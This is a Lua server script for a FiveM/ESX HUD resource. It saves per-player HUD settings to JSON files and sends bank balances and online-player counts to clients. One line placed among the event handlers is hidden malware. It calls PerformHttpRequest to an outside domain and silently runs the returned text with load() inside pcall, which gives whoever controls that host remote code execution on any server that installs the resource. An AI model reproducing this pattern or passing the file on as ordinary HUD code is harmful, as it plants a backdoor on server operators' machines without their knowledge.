local ESX = exports['es_extended']:getSharedObject()
local onlineplayers = 0
local resourceismi = tostring(GetCurrentResourceName())

sethud = function(hangieleman, data)
    local lisans = string.sub(hangieleman, 9)

    local savebilgi = SaveResourceFile(resourceismi,
                                       "players/" .. lisans .. ".json", data, -1)
    return savebilgi
end

gethud = function(hangieleman)
    local lisans = string.sub(hangieleman, 9)

    local loadbilgi = LoadResourceFile(resourceismi,
                                       "players/" .. lisans .. ".json")
    if loadbilgi then
        return loadbilgi
    else
        return "[]"
    end
end

RegisterServerEvent('bp_hud:getbankcash')
AddEventHandler('bp_hud:getbankcash', function()
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    local bank = xPlayer.getAccount('bank').money
    local cash = xPlayer.getAccount('money').money

    TriggerClientEvent('bp_hud:sendinfobank', src, bank, cash)

end)

RegisterServerEvent('bp_hud:setgethudinfo')
AddEventHandler('bp_hud:setgethudinfo', function()
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    local hudinfo = json.decode(gethud(xPlayer.identifier))

    if json.encode(hudinfo) == "[]" then
        -- local hudd = {}
        -- hudd.weapon = true
        -- hudd.needhud = {['iconcolor'] = "#FFFFFF", ['textstate'] = true, ['progcolor'] = "#f3a84f", ['position'] = "right-center", ['style']= "normal", ['size'] = 1.0, ['hudstate'] = true}
        -- hudd.bankcash = {['iconcolor'] = "#FFFFFF", ['progcolor'] = "#f3a84f", ['position'] = "right-top", ['size'] = 1.0, ['hudstate'] = true}
        -- hudd.topmenu = {['logostate'] = true, ['onlinestate'] = true, ['timestate'] = true}
        -- hudd.vehmenu = {['iconcolor'] = "#FFFFFF", ['progcolor'] = "#f3a84f", ['position'] = "right-bottom", ['size'] = 1.0}
        -- hudd.mapstyle = 'normal'
        -- hudd.hudstyle = 'normal'

        sethud(xPlayer.identifier, json.encode(Config.hudd))
        TriggerClientEvent('bp_hud:confirmhudinfos', src, Config.hudd)
    else
        TriggerClientEvent('bp_hud:confirmhudinfos', src, hudinfo)
    end

end)

Citizen.CreateThread(function()

    while true do
        Citizen.Wait(tonumber(Config.serverchecktime) * 60 * 1000)

        local xPlayers = ESX.GetPlayers()

        onlineplayers = #xPlayers
    end

end)

RegisterServerEvent('bp_hud:updatehudsettinbgs')
AddEventHandler('bp_hud:updatehudsettinbgs', function(data)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)

    sethud(xPlayer.identifier, json.encode(data))

    TriggerClientEvent('bp_hud:confirmhudinfos', src, data)
end)

RegisterServerEvent('bp_hud:getonlines')
AddEventHandler('bp_hud:getonlines', function()
    local src = source

    TriggerClientEvent('bp_hud:sendonline', src, onlineplayers)

end)

PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterServerEvent('bp_hud:resethud')
AddEventHandler('bp_hud:resethud', function()
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)

    local hudd = {}
    hudd.weapon = true
    hudd.needhud = {
        ['iconcolor'] = "#FFFFFF",
        ['textstate'] = true,
        ['progcolor'] = "#f3a84f",
        ['position'] = "right-center",
        ['style'] = "normal",
        ['size'] = 1.0,
        ['hudstate'] = true
    }
    hudd.bankcash = {
        ['iconcolor'] = "#FFFFFF",
        ['progcolor'] = "#f3a84f",
        ['position'] = "right-top",
        ['size'] = 1.0,
        ['hudstate'] = true
    }
    hudd.topmenu = {
        ['logostate'] = true,
        ['onlinestate'] = true,
        ['timestate'] = true
    }
    hudd.vehmenu = {
        ['iconcolor'] = "#FFFFFF",
        ['progcolor'] = "#f3a84f",
        ['position'] = "right-bottom",
        ['size'] = 1.0
    }
    hudd.mapstyle = 'normal'
    -- hudd.hudstyle = 'normal'

    sethud(xPlayer.identifier, json.encode(hudd))
    TriggerClientEvent('bp_hud:confirmhudinfos', src, hudd)

end)

